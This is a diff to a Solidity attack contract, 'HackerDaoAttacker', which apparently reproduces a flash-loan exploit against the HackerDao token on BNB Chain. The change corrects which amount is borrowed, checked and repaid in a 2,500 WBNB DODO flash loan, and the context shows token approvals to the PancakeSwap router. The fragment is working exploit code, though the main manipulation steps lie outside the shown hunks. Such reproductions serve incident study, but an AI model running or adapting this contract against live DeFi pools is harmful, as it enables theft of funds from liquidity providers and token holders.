@@ -69,8 +69,8 @@ contract HackerDaoAttacker is Ownable {
     function startFlashLoan() public {
         uint256 borrown_wbnb_amt = 2_500_000_000_000_000_000_000;
         DPPAdvancedCallBackData memory callbackData;
-        callbackData.baseAmount = 0;
-        callbackData.quoteAmount = borrown_wbnb_amt;
+        callbackData.baseAmount = borrown_wbnb_amt;
+        callbackData.quoteAmount = 0;
         bytes memory data = abi.encode(callbackData);
 
         IDPPAdvanced(DPPAdvanced).flashLoan(borrown_wbnb_amt, 0, address(this), data);
@@ -91,7 +91,7 @@ contract HackerDaoAttacker is Ownable {
         DPPAdvancedCallBackData memory info = abi.decode(data, (DPPAdvancedCallBackData));
         console.log("owner address %s contract address %s", owner(), address(this));
         // require(address(this) == owner(), "owner address check");
-        require(IWBNB(WBNB).balanceOf(address(this)) == info.quoteAmount,"must equal");
+        require(IWBNB(WBNB).balanceOf(address(this)) == info.baseAmount,"must equal");
         console.log("Now I have flash loaned WBNB num # %s",IWBNB(WBNB).balanceOf(address(this)));
         
         IHackerDao(HackerDao).approve(PancakerRouter, type(uint256).max); // 
@@ -143,7 +143,7 @@ contract HackerDaoAttacker is Ownable {
         // IWBNB(WBNB).withdraw(my_wbnb_amt);
         // return all borrow wbnb
         // console.log("my wbnb amt: %s and payback amt: %s",my_wbnb_amt,info.quoteAmount);
-        IERC20(WBNB).transfer(DPPAdvanced, info.quoteAmount);
+        IERC20(WBNB).transfer(DPPAdvanced, info.baseAmount);
         uint256 my_wbnb_amt = IWBNB(WBNB).balanceOf(address(this));
         IWBNB(WBNB).withdraw(my_wbnb_amt);
     }
